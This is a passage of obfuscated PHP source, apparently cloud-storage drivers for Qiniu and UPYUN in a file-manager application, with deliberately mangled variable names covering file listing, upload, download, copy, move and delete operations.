$óîì£€ï[$•‰¤´÷ì] = array($’ë«êê[79] => 0); } } return $this->listAllFiles($Ô½î¡‹, $óîì£€ï); } private function fileList($ÈöŸŠÅô, $í€á¥Ãê = '', $ú·Ü‹Äù = 0) { $»ú©‹· =& $_SERVER[«òÑğ]; $ÈöŸŠÅô = trim($ÈöŸŠÅô, $»ú©‹·[8]); $›ß¤‚İ = empty($ÈöŸŠÅô) && $ÈöŸŠÅô !== $»ú©‹·[231] ? $»ú©‹·[12] : $ÈöŸŠÅô . $»ú©‹·[8]; $Ù«ÕÌ¯± = $»ú©‹·[12]; $Íè’Ö½ = 1000; $‘ú¼À™ƒ = $ÎÈ¸ú¿Á = array(); while (!0) { check_abort(); list($ŸêÚŠ÷², $¤‘ĞŠÁ) = $this->bucketManager->listFiles($this->bucket, $›ß¤‚İ, $Ù«ÕÌ¯±, $Íè’Ö½, $í€á¥Ãê); if ($¤‘ĞŠÁ) { break; } $Ù«ÕÌ¯± = array_key_exists($»ú©‹·[1488], $ŸêÚŠ÷²) ? $Ù«ÕÌ¯± = $ŸêÚŠ÷²[$»ú©‹·[1544]] : $»ú©‹·[12]; $¼âÚµşñ = isset($ŸêÚŠ÷²[$»ú©‹·[1545]]) ? $ŸêÚŠ÷²[$»ú©‹·[1545]] : array(); $Ñ««ò´ = isset($ŸêÚŠ÷²[$»ú©‹·[1546]]) ? $ŸêÚŠ÷²[$»ú©‹·[1546]] : array(); foreach ($¼âÚµşñ as $ËÄá¯Ü”) { if ($ËÄá¯Ü”[$»ú©‹·[97]] == $›ß¤‚İ) { continue; } $ŸúÃ®£è = $ËÄá¯Ü”[$»ú©‹·[97]]; $æ—÷Ó§¸ = $ËÄá¯Ü”[$»ú©‹·[1542]]; $ËÄá¯Ü”[$»ú©‹·[79]] = $æ—÷Ó§¸; $€Å¹±·— = $æ—÷Ó§¸ == 0 && substr($ŸúÃ®£è, strlen($ŸúÃ®£è) - 1, 1) == $»ú©‹·[8] ? !0 : !1; $this->cacheMethodInfoSet($ŸúÃ®£è, $€Å¹±·—, $ËÄá¯Ü”); if ($€Å¹±·—) { $‘ú¼À™ƒ[] = $ŸúÃ®£è; continue; } $ÎÈ¸ú¿Á[] = $ú·Ü‹Äù ? $ËÄá¯Ü” : $ŸúÃ®£è; } foreach ($Ñ««ò´ as $ŸúÃ®£è) { if ($ŸúÃ®£è == $›ß¤‚İ) { continue; } $‘ú¼À™ƒ[] = $ŸúÃ®£è; $this->cacheMethodInfoSet($ŸúÃ®£è, !0); } if ($Ù«ÕÌ¯± === $»ú©‹·[12]) { break; } } $this->cacheMethodInfoSet($ÈöŸŠÅô, !0); return array($»ú©‹·[85] => $‘ú¼À™ƒ, $»ú©‹·[86] => $ÎÈ¸ú¿Á); } public function canRead($ÉªıèÓ) { return $this->exist($ÉªıèÓ) ? !0 : !1; } public function canWrite($üÁ€Ÿ…¬) { return $this->exist($üÁ€Ÿ…¬) ? !0 : !1; } public function getContent($è±Èİß„) { return $this->fileSubstr($è±Èİß„, 0, -1); } public function setContent($çé«Ò±È, $°„Úê¦ = '') { $ö²ÉĞ„ = $this->tempFile($this->pathThis($çé«Ò±È)); file_put_contents($ö²ÉĞ„, $°„Úê¦); if ($this->upload($çé«Ò±È, $ö²ÉĞ„)) { $this->tempFileRemve($ö²ÉĞ„); return !0; } return !1; } public function refreshUrls($“®Á™­¦) { $¹¢½¬İì =& $_SERVER[«òÑğ]; $õšùàá² = array(); if (is_array($“®Á™­¦)) { foreach ($“®Á™­¦ as $ıŒîËÌó) { $õšùàá²[] = $this->link($ıŒîËÌó); } } else { $õšùàá²[] = $this->link($“®Á™­¦); } $›Ñ†óÑË = new Qiniu\Cdn\CdnManager($this->auth); list($£¼‡•õá, $Àş¼’) = $›Ñ†óÑË->refreshUrls($õšùàá²); if ($Àş¼’) { return !1; } return $£¼‡•õá[$¹¢½¬İì[1274]] == $¹¢½¬İì[843] ? !0 : !1; } public function fileSubstr($ßó¦Äö, $ñÙ¯Øï¬, $«»İ£‰Ù) { $Ÿ‡Í¨Æ =& $_SERVER[«òÑğ]; if (!($Š¤‹­¦¢ = $this->link($ßó¦Äö))) { return !1; } $ºãÈõ¹ = !1; if ($«»İ£‰Ù > 0) { $®ıš€”Î = $ñÙ¯Øï¬ + $«»İ£‰Ù - 1; $ºãÈõ¹ = array($Ÿ‡Í¨Æ[1547] . $ñÙ¯Øï¬ . $Ÿ‡Í¨Æ[465] . $®ıš€”Î); } $Í£±”øà = url_request($Š¤‹­¦¢, $Ÿ‡Í¨Æ[1507], !1, $ºãÈõ¹); return $Í£±”øà[$Ÿ‡Í¨Æ[834]] ? $Í£±”øà[$Ÿ‡Í¨Æ[1297]] : !1; } public function upload($‚ Æ¢ª, $ÂüçĞÉ, $¥Ì²–²‚ = false, $¯Ê•¢Û™ = REPEAT_REPLACE) { $·ÎÓµ = new Qiniu\Storage\UploadManager(); $¬ŞÃÏû‡ = $this->auth->uploadToken($this->bucket, $‚ Æ¢ª); $ıòñÕ¼Š = get_file_mime(get_path_ext($ÂüçĞÉ)); list($ÁÛßËô÷, $î¿Ññ“›) = $·ÎÓµ->putFile($¬ŞÃÏû‡, $‚ Æ¢ª, $ÂüçĞÉ, null, $ıòñÕ¼Š); return $î¿Ññ“› ? !1 : $this->getPathOuter($‚ Æ¢ª); } public function uploadFormData($×¾¶”ë, $ Å“Ëá¶ = 3600) { return $this->uploadToken($×¾¶”ë, $ Å“Ëá¶); } public function uploadMultiData($‡Ê¿€•, $§¿ Ùòş = 3600) { return $this->uploadToken($‡Ê¿€•, $§¿ Ùòş); } private function uploadToken($–ï›ğíª, $œÅË„øå = 3600) { $Á ¯‰Éá =& $_SERVER[«òÑğ]; $¢¸·Óóú = $œÅË„øå; $Àà‘ş´Ş = array($Á ¯‰Éá[1548] => $Á ¯‰Éá[1549]); $Ê‹Õ‘œË = $–ï›ğíª; $¹é”¢º¾ = $this->auth->uploadToken($this->bucket, $Ê‹Õ‘œË, $¢¸·Óóú, $Àà‘ş´Ş, !0); $µÈìŸÁ´ = empty($this->region) || $this->region == $Á ¯‰Éá[1550] ? $Á ¯‰Éá[12] : $Á ¯‰Éá[465] . $this->region; $è‘‹¥İÊ = http_type() . "\x3a\x2f\x2f\165\x70\x6c\x6f\x61\x64{$µÈìŸÁ´}\56\161\x69\156\151\165\x70\x2e\143\x6f\155\x2f"; return array($Á ¯‰Éá[1551] => $¹é”¢º¾, $Á ¯‰Éá[1552] => $è‘‹¥İÊ); } public function download($‰”Ü°Œ, $è¢Å¥¸) { $­Ö‡÷¦¤ = IO::getPathInner(IO::mkfile($è¢Å¥¸)); if (!($êÑò—Ì´ = $this->link($‰”Ü°Œ))) { return !1; } $Ë¬˜àÆ = 0; $”ûøö»¾ = 1024 * 200; $÷™ì´Ï’ = fopen($­Ö‡÷¦¤, $_SERVER[«òÑğ][1553]); while (!0) { $è óŠæª = $this->fileSubstr($‰”Ü°Œ, $Ë¬˜àÆ, $”ûøö»¾); if ($è óŠæª === !1) { return !1; } fwrite($÷™ì´Ï’, $è óŠæª); $Ë¬˜àÆ += $”ûøö»¾; if (strlen($è óŠæª) < $”ûøö»¾) { break; } } fclose($÷™ì´Ï’); return $è¢Å¥¸; } public function link($ùØ¬»€ù, $Ö¨ ˆ»± = '') { if (!$this->isFile($ùØ¬»€ù)) { return !1; } $ıË°ñ×© = $this->getHost() . $_SERVER[«òÑğ][8] . $this->pathEncode($ùØ¬»€ù) . $Ö¨ ˆ»±; return $this->auth->privateDownloadUrl($ıË°ñ×©, 3600 * 12); } public function fileOut($áéüÓîÂ, $›½¶úç÷ = false, $è•éÀØ” = false, $¬æÙ©ïê = '') { $½á€—öÓ =& $_SERVER[«òÑğ]; if ($this->isFileOutServer()) { return $this->fileOutServer($áéüÓîÂ, $›½¶úç÷, $è•éÀØ”, $¬æÙ©ïê); } if (!$è•éÀØ”) { $è•éÀØ” = $this->pathThis($áéüÓîÂ); } $‘„ø‚ÈÃ = $›½¶úç÷ ? $½á€—öÓ[1554] . rawurlencode($è•éÀØ”) : $½á€—öÓ[12]; $ê¡ÏÒàê = $this->link($áéüÓîÂ, $‘„ø‚ÈÃ); $this->fileOutLink($ê¡ÏÒàê); } public function fileOutServer($£ı»çú, $ï¢Âçè¾ = false, $êº„úÔ€ = false, $Ì©ˆæÊ = '') { parent::fileOut($£ı»çú, $ï¢Âçè¾, $êº„úÔ€, $Ì©ˆæÊ); } public function fileOutImage($å„¨¶¿µ, $Õò´î¢• = 250) { if ($this->size($å„¨¶¿µ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($å„¨¶¿µ, $Õò´î¢•); } $Åùåõ§¤ = $this->link($å„¨¶¿µ, $_SERVER[«òÑğ][1555] . $Õò´î¢•); $this->fileOutLink($Åùåõ§¤); } public function fileOutImageServer($á†¢ì„, $«³ÂÒÀƒ = 250) { parent::fileOutImage($á†¢ì„, $«³ÂÒÀƒ); } public function hashMd5($…Ü…­ÀÛ) { $ùÙÇ–â =& $_SERVER[«òÑğ]; $Á¶·µäˆ = $this->objectMeta($…Ü…­ÀÛ); return isset($Á¶·µäˆ[$ùÙÇ–â[248]]) ? $Á¶·µäˆ[$ùÙÇ–â[248]] : !1; $Íö¿ÂŒ² = $this->link($…Ü…­ÀÛ, $ùÙÇ–â[1556]); } public function size($ÄÓŒ¡–×) { $óì¤ÜŠ = $this->objectMeta($ÄÓŒ¡–×); return $óì¤ÜŠ ? $óì¤ÜŠ[$_SERVER[«òÑğ][79]] : 0; } public function info($Âïş¡ÛÓ) { if ($this->isFolder($Âïş¡ÛÓ)) { return $this->folderInfo($Âïş¡ÛÓ); } else { if ($this->isFile($Âïş¡ÛÓ)) { return $this->fileInfo($Âïş¡ÛÓ); } } return !1; } public function exist($µÛü¨ş) { return $this->isFile($µÛü¨ş) || $this->isFolder($µÛü¨ş); } public function isFile($çÑ®Å¸) { return !$this->isFolder($çÑ®Å¸) && $this->objectMeta($çÑ®Å¸); } public function isFolder($–ó’•‚Í) { return $this->cacheMethod($_SERVER[«òÑğ][180], $–ó’•‚Í); } protected function objectMeta($Ó‚šŠ) { return $this->cacheMethod($_SERVER[«òÑğ][182], $Ó‚šŠ); } protected function _objectMeta($Î»ªÀ) { $ÑÎ¹ê½¯ =& $_SERVER[«òÑğ]; list($§³òÄÃ, $³êÙïµ) = $this->bucketManager->stat($this->bucket, $Î»ªÀ); if ($§³òÄÃ) { $§³òÄÃ[$ÑÎ¹ê½¯[79]] = intval($§³òÄÃ[$ÑÎ¹ê½¯[1542]]); } return $§³òÄÃ; } protected function _isFolder($¯Ö±şØ) { $ŸÔÖÀ»Ñ =& $_SERVER[«òÑğ]; if ($¯Ö±şØ == $ŸÔÖÀ»Ñ[12] || $¯Ö±şØ == $ŸÔÖÀ»Ñ[8]) { return !0; } list($œÁÉŠª©, $€×­®³) = $this->bucketManager->listFiles($this->bucket, trim($¯Ö±şØ, $ŸÔÖÀ»Ñ[8]) . $ŸÔÖÀ»Ñ[8], $ŸÔÖÀ»Ñ[12], 1, $ŸÔÖÀ»Ñ[8]); return !empty($œÁÉŠª©[$ŸÔÖÀ»Ñ[1545]]) || !empty($œÁÉŠª©[$ŸÔÖÀ»Ñ[1546]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($µŒëâëî, $À™Š™Èş = 0) { parent::__construct(); $this->source = $µŒëâëî; $this->sourceSize = $À™Š™Èş; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($øš¡ÇÒ = false) { return $this->sourceSize; } public function getContent($ò–ĞÖÉÊ = false) { return $this->fileSubstr($ò–ĞÖÉÊ, 0, $this->sourceSize); } public function fileSubstr($ÈïÚüé© = false, $½ÒâÈ¹Ñ = 0, $öºîˆ¢ñ = 0) { if (!$öºîˆ¢ñ) { $öºîˆ¢ñ = $this->sourceSize; } $í—§µÖ“ = $this->sourceSize - $½ÒâÈ¹Ñ; if ($öºîˆ¢ñ >= $í—§µÖ“) { $öºîˆ¢ñ = $í—§µÖ“; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $½ÒâÈ¹Ñ, $öºîˆ¢ñ); } if ($this->sourceType == self::TYPE_FILE) { if ($öºîˆ¢ñ <= 0) { return $_SERVER[«òÑğ][12]; } $ªš‚¾ = ftell($this->source); fseek_64($this->source, $ªš‚¾ + $½ÒâÈ¹Ñ); $Óö±Í¨ï = @fread($this->source, $öºîˆ¢ñ); fseek_64($this->source, $ªš‚¾); return $Óö±Í¨ï; } } public function hashMd5($ÃáÌ’ï = false) { return md5($this->getContent()); } public static function hash($ó‡ˆÛõà, $Şã¾«¿´ = 0) { $ÔÛŞèè = new PathDriverStream($ó‡ˆÛõà, $Şã¾«¿´); return $ÔÛŞèè->hashSimple($ó‡ˆÛõà); } public static function md5($øû²ÍÕ, $•œ¬çÏ¥ = 0) { $ÁñÈÄ¸ı = new PathDriverStream($øû²ÍÕ, $•œ¬çÏ¥); return $ÁñÈÄ¸ı->hashMd5($øû²ÍÕ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\x2f\57\x76\60\56\141\160\x69\x2e\x75\160\171\165\x6e\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ø’®¿¹Í) { parent::__construct(); $this->_init($Ø’®¿¹Í); } public function _init($Š—Êåõ) { $…şû½˜Á =& $_SERVER[«òÑğ]; foreach ($Š—Êåõ as $³š‚»É => $„ƒÕø•Â) { if (isset($this->{$³š‚»É})) { $this->{$³š‚»É} = $„ƒÕø•Â; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($…şû½˜Á[1557] . LNG($…şû½˜Á[1476])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ËÈé€×Œ, $Í°ğ¼ = "\107\x45\x54") { $çÜ«øÑé =& $_SERVER[«òÑğ]; $ƒğË¢­ = gmdate($çÜ«øÑé[1505]); $è‚›ª—Î = base64_encode(hash_hmac($çÜ«øÑé[1558], "{$Í°ğ¼}\46{$ËÈé€×Œ}\x26{$ƒğË¢­}", md5("{$this->userpass}"), !0)); $ÖêÓÌËß = array("\101\165\x74\x68\x6f\x72\151\x7a\x61\164\x69\x6f\156\72\x55\120\131\125\x4e\40{$this->username}\x3a{$è‚›ª—Î}", "\104\141\x74\145\72{$ƒğË¢­}"); return $ÖêÓÌËß; } public function ussRequest($Ù…ÖÆÒ—, $ñ²²ÖÚ = "\x47\x45\x54", $ş òÀ•å = false, $é“Ûôéˆ = false, $²¬Û šş = false) { $…Œğšü¯ =& $_SERVER[«òÑğ]; $Ù…ÖÆÒ— = trim($Ù…ÖÆÒ—, $…Œğšü¯[8]); $ïÚËÌ© = "\57{$this->bucket}\57" . rawurlencode($Ù…ÖÆÒ—); $ÑõôÉä¾ = $this->ussHeaders($ïÚËÌ©, $ñ²²ÖÚ); if ($é“Ûôéˆ) { $ÑõôÉä¾ = array_merge($ÑõôÉä¾, $é“Ûôéˆ); } $ªÄ…š§ = url_request($this->endpoint . $ïÚËÌ©, $ñ²²ÖÚ, $ş òÀ•å, $ÑõôÉä¾, $²¬Û šş); if (!$ªÄ…š§) { $Ô¯•û¤ñ = LNG($…Œğšü¯[1559]); $this->writeLog($Ô¯•û¤ñ); return array($…Œğšü¯[1307] => !1, $…Œğšü¯[1297] => $Ô¯•û¤ñ); } if (strtolower($ñ²²ÖÚ) == $…Œğšü¯[230] || in_array($ªÄ…š§[$…Œğšü¯[1307]], array($…Œğšü¯[264], $…Œğšü¯[1560]))) { $ş òÀ•å = $ªÄ…š§[$…Œğšü¯[1561]]; if (!$ªÄ…š§[$…Œğšü¯[834]]) { $ş òÀ•å = isset($ş òÀ•å[0]) ? $ş òÀ•å[0] : $…Œğšü¯[12]; } } else { $ş òÀ•å = json_decode($ªÄ…š§[$…Œğšü¯[1297]], !0); if (!$ş òÀ•å) { $ş òÀ•å = $ªÄ…š§[$…Œğšü¯[1297]]; } else { if (!$ªÄ…š§[$…Œğšü¯[834]] && isset($ş òÀ•å[$…Œğšü¯[1562]])) { $ş òÀ•å = $ş òÀ•å[$…Œğšü¯[1562]]; } } } if (!$ªÄ…š§[$…Œğšü¯[834]]) { $this->writeLog($this->__errorMessage($ş òÀ•å)); } return array($…Œğšü¯[1307] => $ªÄ…š§[$…Œğšü¯[834]], $…Œğšü¯[1297] => $ş òÀ•å); } private function __errorMessage($§™¢ãÖô) { $ğà¿¡·Ú =& $_SERVER[«òÑğ]; if (!$§™¢ãÖô) { return $ğà¿¡·Ú[12]; } static $ï³ÏÄ° = null; if (!$ï³ÏÄ°) { $ï³ÏÄ° = I18n::getType(); } if ($ï³ÏÄ° != $ğà¿¡·Ú[1515]) { return $§™¢ãÖô; } $ÖŠŞó„„ = array($ğà¿¡·Ú[1563] => $ğà¿¡·Ú[1564], $ğà¿¡·Ú[1565] => $ğà¿¡·Ú[1566], $ğà¿¡·Ú[1567] => $ğà¿¡·Ú[1566], $ğà¿¡·Ú[1568] => $ğà¿¡·Ú[1569], $ğà¿¡·Ú[1570] => $ğà¿¡·Ú[1571], $ğà¿¡·Ú[1572] => $ğà¿¡·Ú[1573], $ğà¿¡·Ú[1574] => $ğà¿¡·Ú[1575]); return isset($ÖŠŞó„„[$§™¢ãÖô]) ? $ÖŠŞó„„[$§™¢ãÖô] : $§™¢ãÖô; } public function mkfile($æ‰øĞÅÆ, $“’È«Íû = '', $ŠÅ¢òû¯ = REPEAT_RENAME) { if ($this->setContent($æ‰øĞÅÆ, $“’È«Íû)) { return $this->getPathOuter($æ‰øĞÅÆ); } return !1; } public function mkdir($­Â•Ø•å, $æ¤êêâæ = REPEAT_SKIP) { $¿‹éÉŒ¶ =& $_SERVER[«òÑğ]; $ú½È§ƒ¹ = trim($­Â•Ø•å, $¿‹éÉŒ¶[8]); if ($this->_isFolder($ú½È§ƒ¹)) { return $this->getPathOuter($ú½È§ƒ¹); } $Ó‹ß‚ÉË = array($¿‹éÉŒ¶[1576]); $ÊúÍ„¾ê = $this->ussRequest($ú½È§ƒ¹, $¿‹éÉŒ¶[291], !1, $Ó‹ß‚ÉË); return $ÊúÍ„¾ê[$¿‹éÉŒ¶[1307]] ? $this->getPathOuter($ú½È§ƒ¹) : !1; } public function copyFile($¼ÌÏÉÌè, $ªè·Çº) { $ïšóŸ÷­ =& $_SERVER[«òÑğ]; $û¶ü ˆ† = array($ïšóŸ÷­[1577] . "\57{$this->bucket}\x2f{$¼ÌÏÉÌè}", $ïšóŸ÷­[1578]); $«î©ˆ²¢ = $this->ussRequest($ªè·Çº, $ïšóŸ÷­[256], !1, $û¶ü ˆ†); return $«î©ˆ²¢[$ïšóŸ÷­[1307]] ? !0 : $this->getPathOuter($ªè·Çº); } public function moveFile($Ñ¯”êô, $€Ü–°¸) { $µ½“³µ =& $_SERVER[«òÑğ]; $¦å©‚æ = array($µ½“³µ[1579] . "\x2f{$this->bucket}\x2f{$Ñ¯”êô}", $µ½“³µ[1578]); $İïÊö¡— = $this->ussRequest($€Ü–°¸, $µ½“³µ[256], !1, $¦å©‚æ); return $İïÊö¡—[$µ½“³µ[1307]] ? !0 : $this->getPathOuter($€Ü–°¸); } public function delFile($â°º±è’) { $ÏÓüìØ =& $_SERVER[«òÑğ]; $Ñ…ÏÃÑş = $this->ussRequest($â°º±è’, $ÏÓüìØ[1580]); return $Ñ…ÏÃÑş[$ÏÓüìØ[1307]] ? !0 : !1; } public function delFolder($éàÄÀ™) { $ïšÁ²ÈŸ =& $_SERVER[«òÑğ]; if (!$this->exist($éàÄÀ™)) { return !0; } $this->listItemCache = !1; $Æ¶¸âŒ = $æŸİşÂÆ = array(); $this->fileList($éàÄÀ™, $Æ¶¸âŒ, $æŸİşÂÆ, !0); $this->listItemCache = !0; foreach ($æŸİşÂÆ as $âæßâ) { $úé Ÿ¾„ = $this->ussRequest($âæßâ[$ïšÁ²ÈŸ[32]], $ïšÁ²ÈŸ[1580]); if (!$úé Ÿ¾„[$ïšÁ²ÈŸ[1307]]) { return !1; } } usort($Æ¶¸âŒ, function ($¿ğøßú, $±ÑÚ¸Áğ) { $£Ì¼¤…Â =& $_SERVER[«òÑğ]; return substr_count($±ÑÚ¸Áğ, $£Ì¼¤…Â[8]) - substr_count($¿ğøßú, $£Ì¼¤…Â[8]); }); foreach ($Æ¶¸âŒ as $­˜›¹ÛÓ) { $úé Ÿ¾„ = $this->ussRequest($­˜›¹ÛÓ, $ïšÁ²ÈŸ[1580]); if (!$úé Ÿ¾„[$ïšÁ²ÈŸ[1307]]) { return !1; } } $úé Ÿ¾„ = $this->ussRequest($éàÄÀ™, $ïšÁ²ÈŸ[1580]); return $úé Ÿ¾„[$ïšÁ²ÈŸ[1307]]; } public function rename($Ó¶çÎÁí, $Â¤‡úú¡) { if ($this->isFile($Ó¶çÎÁí)) { $Â¤‡úú¡ = get_path_father($Ó¶çÎÁí) . $Â¤‡úú¡; return $this->moveFile($Ó¶çÎÁí, $Â¤‡úú¡); } return $this->renameObject($Ó¶çÎÁí, $Â¤‡úú¡); } public function fileInfo($ÎÊ®¨˜û, $ ÛŒ®ë· = false, $²óûù»Õ = array()) { $ÁÁà‹€Æ =& $_SERVER[«òÑğ]; $ÖÍ õğ° = array($ÁÁà‹€Æ[32] => $this->pathThis($ÎÊ®¨˜û), $ÁÁà‹€Æ[87] => $this->getPathOuter($ÁÁà‹€Æ[8] . $ÎÊ®¨˜û), $ÁÁà‹€Æ[33] => $ÁÁà‹€Æ[233], $ÁÁà‹€Æ[79] => isset($²óûù»Õ[$ÁÁà‹€Æ[79]]) ? $²óûù»Õ[$ÁÁà‹€Æ[79]] : 0, $ÁÁà‹€Æ[169] => $this->ext($ÎÊ®¨˜û)); if ($ ÛŒ®ë·) { return $ÖÍ õğ°; } $ÖÍ õğ°[$ÁÁà‹€Æ[234]] = $ÖÍ õğ°[$ÁÁà‹€Æ[88]] = 0; $ÖÍ õğ°[$ÁÁà‹€Æ[235]] = $ÖÍ õğ°[$ÁÁà‹€Æ[236]] = !0; if (empty($²óûù»Õ)) { $²óûù»Õ = $this->objectMeta($ÎÊ®¨˜û); if (!$²óûù»Õ) { return $ÖÍ õğ°; } } $ÖÍ õğ°[$ÁÁà‹€Æ[234]] = intval($²óûù»Õ[$ÁÁà‹€Æ[1581]]); $ÖÍ õğ°[$ÁÁà‹€Æ[88]] = intval($²óûù»Õ[$ÁÁà‹€Æ[1582]]); $ÖÍ õğ°[$ÁÁà‹€Æ[79]] = $²óûù»Õ[$ÁÁà‹€Æ[79]]; return $ÖÍ õğ°; } public function folderInfo($üÜ¦àÃ×, $ç¸Ü†øŒ = false) { $åÕûÏô‘ =& $_SERVER[«òÑğ]; $‹Ç•¿ˆ™ = array($åÕûÏô‘[32] => $this->pathThis($üÜ¦àÃ×), $åÕûÏô‘[87] => $this->getPathOuter($åÕûÏô‘[8] . $üÜ¦àÃ×), $åÕûÏô‘[33] => $åÕûÏô‘[78]); if ($ç¸Ü†øŒ) { return $‹Ç•¿ˆ™; } $‹Ç•¿ˆ™[$åÕûÏô‘[234]] = $‹Ç•¿ˆ™[$åÕûÏô‘[88]] = 0; $‹Ç•¿ˆ™[$åÕûÏô‘[235]] = $‹Ç•¿ˆ™[$åÕûÏô‘[236]] = !0; if (empty($èĞ®æ´î)) { $èĞ®æ´î = $this->objectMeta($üÜ¦àÃ×); if (!$èĞ®æ´î) { return $‹Ç•¿ˆ™; } } $‹Ç•¿ˆ™[$åÕûÏô‘[234]] = intval($èĞ®æ´î[$åÕûÏô‘[1581]]); $‹Ç•¿ˆ™[$åÕûÏô‘[88]] = intval($èĞ®æ´î[$åÕûÏô‘[1582]]); return $‹Ç•¿ˆ™; } private function listObjs($ò«ùĞ‡†, $€Æ…Ëì¹ = 0, $–·Æ«±î = 1000) { $÷×ãäş’ =& $_SERVER[«òÑğ]; $‹ä”¤ã = array($÷×ãäş’[1583], $÷×ãäş’[1584] . $–·Æ«±î); if ($€Æ…Ëì¹) { $‹ä”¤ã[] = $÷×ãäş’[1585] . $€Æ…Ëì¹; } $ì€«°ô¨ = $this->ussRequest($ò«ùĞ‡†, $÷×ãäş’[1507], !1, $‹ä”¤ã); return !$ì€«°ô¨[$÷×ãäş’[1307]] ? !1 : $ì€«°ô¨[$÷×ãäş’[1297]]; } private function fileList($´¸´¦æÔ, &$áÀßÚš‡, &$ìµãÓÓ¬, $ ¹‰¤äŸ = false) { $ºßÆåØƒ =& $_SERVER[«òÑğ]; $–¦‚°Â– = $ºßÆåØƒ[12]; $¬áÇ¥Ïé = 1000; $¿¤ŞÈ¿ø = rtrim($´¸´¦æÔ, $ºßÆåØƒ[8]) . $ºßÆåØƒ[8]; while (!0) { check_abort(); $ú§öÛâß = $this->listObjs($´¸´¦æÔ, $–¦‚°Â–, $¬áÇ¥Ïé); if (!$ú§öÛâß) { return !1; } $–¦‚°Â– = isset($ú§öÛâß[$ºßÆåØƒ[1586]]) ? $ú§öÛâß[$ºßÆåØƒ[1586]] : $ºßÆåØƒ[12]; $ááÒê÷ß = isset($ú§öÛâß[$ºßÆåØƒ[1587]]) ? $ú§öÛâß[$ºßÆåØƒ[1587]] : array(); foreach ($ááÒê÷ß as $êÀ¾İï¯) { $ÖÅ®‘×ª = $êÀ¾İï¯[$ºßÆåØƒ[33]] == $ºßÆåØƒ[78] ? !0 : !1; $ì§ì©ƒã = ltrim($¿¤ŞÈ¿ø . $êÀ¾İï¯[$ºßÆåØƒ[32]], $ºßÆåØƒ[8]) . ($ÖÅ®‘×ª ? $ºßÆåØƒ[8] : $ºßÆåØƒ[12]); $”¹éíñ = array($ºßÆåØƒ[32] => $ì§ì©ƒã, $ºßÆåØƒ[33] => $ÖÅ®‘×ª ? $ºßÆåØƒ[78] : $ºßÆåØƒ[233], $ºßÆåØƒ[79] => $êÀ¾İï¯[$ºßÆåØƒ[415]], $ºßÆåØƒ[1582] => $êÀ¾İï¯[$ºßÆåØƒ[1588]]); $this->cacheMethodInfoSet($ì§ì©ƒã, $ÖÅ®‘×ª, $”¹éíñ); if ($ÖÅ®‘×ª) { $áÀßÚš‡[] = $ì§ì©ƒã; if ($ ¹‰¤äŸ) { $this->fileList($ì§ì©ƒã, $áÀßÚš‡, $ìµãÓÓ¬, $ ¹‰¤äŸ); } continue; } $ìµãÓÓ¬[] = $”¹éíñ; } if (count($ááÒê÷ß) < $¬áÇ¥Ïé) { break; } } $this->cacheMethodInfoSet($´¸´¦æÔ, !0); } public function listPath($å’¼“›, $™®Ûì‰ = false) { $Ë×º§ŞŒ =& $_SERVER[«òÑğ]; $ÌÍ³±— = $¢¹ø¾É· = array(); $this->fileList($å’¼“›, $ÌÍ³±—, $¢¹ø¾É·); foreach ($ÌÍ³±— as $šªš˜² => $¬·Àš¡ı) { $ÌÍ³±—[$šªš˜²] = $this->folderInfo($¬·Àš¡ı, $™®Ûì‰); } foreach ($¢¹ø¾É· as $šªš˜² => $¬·Àš¡ı) { $¢¹ø¾É·[$šªš˜²] = $this->fileInfo($¬·Àš¡ı[$Ë×º§ŞŒ[32]], $™®Ûì‰, $¬·Àš¡ı); } return array($Ë×º§ŞŒ[85] => $ÌÍ³±—, $Ë×º§ŞŒ[86] => $¢¹ø¾É·); } public function has($çûæÀ¶å, $†µÌ‹“¹ = false, $ôïÂçŒï = true) { $–ÔéËŞ =& $_SERVER[«òÑğ]; $Ïœ­ÂÓË = $–ÔéËŞ[12]; $ë‹ø±øÏ = 500; $±àùƒ‚¼ = 0; $¨çûŠ = 0; $ïº„½Ûâ = rtrim($çûæÀ¶å, $–ÔéËŞ[8]) . $–ÔéËŞ[8]; while (!0) { check_abort(); $Œñ‡ò = $this->listObjs($çûæÀ¶å, $Ïœ­ÂÓË, $ë‹ø±øÏ); if (!$Œñ‡ò) { return !1; } $Ïœ­ÂÓË = isset($Œñ‡ò[$–ÔéËŞ[1586]]) ? $Œñ‡ò[$–ÔéËŞ[1586]] : $–ÔéËŞ[12]; $ºÓÖ€Í = isset($Œñ‡ò[$–ÔéËŞ[1587]]) ? $Œñ‡ò[$–ÔéËŞ[1587]] : array(); if (empty($ºÓÖ€Í)) { break; } $¤…ËŒÀÚ = array_filter($ºÓÖ€Í, function ($ºœø») { $“Æã´øû =& $_SERVER[«òÑğ]; return $ºœø»[$“Æã´øû[33]] == $“Æã´øû[78]; }); $Õ½œä‰ñ = count($ºÓÖ€Í); $¤…ËŒÀÚ = count($¤…ËŒÀÚ); $ŠÕ¡è²Ã = $Õ½œä‰ñ - $¤…ËŒÀÚ; if ($†µÌ‹“¹) { $¨çûŠ += $¤…ËŒÀÚ; $±àùƒ‚¼ += $ŠÕ¡è²Ã; if ($Õ½œä‰ñ < $ë‹ø±øÏ) { break; } continue; } if ($ôïÂçŒï) { if ($ŠÕ¡è²Ã) { return !0; } } else { if ($¤…ËŒÀÚ) { return !0; } } if ($Õ½œä‰ñ < $ë‹ø±øÏ) { break; } } if ($†µÌ‹“¹) { return array($–ÔéËŞ[242] => $±àùƒ‚¼, $–ÔéËŞ[243] => $¨çûŠ); } return !1; } public function listAll($›î±£ñ¼) { $É«¨Ûµ =& $_SERVER[«òÑğ]; $—şåãûô = $øˆòõ¹ = array(); $this->fileList($›î±£ñ¼, $—şåãûô, $øˆòõ¹, !0); $®¬ºƒËæ = array_to_keyvalue($øˆòõ¹, $É«¨Ûµ[32]); foreach ($—şåãûô as $¿šíæ°©) { if 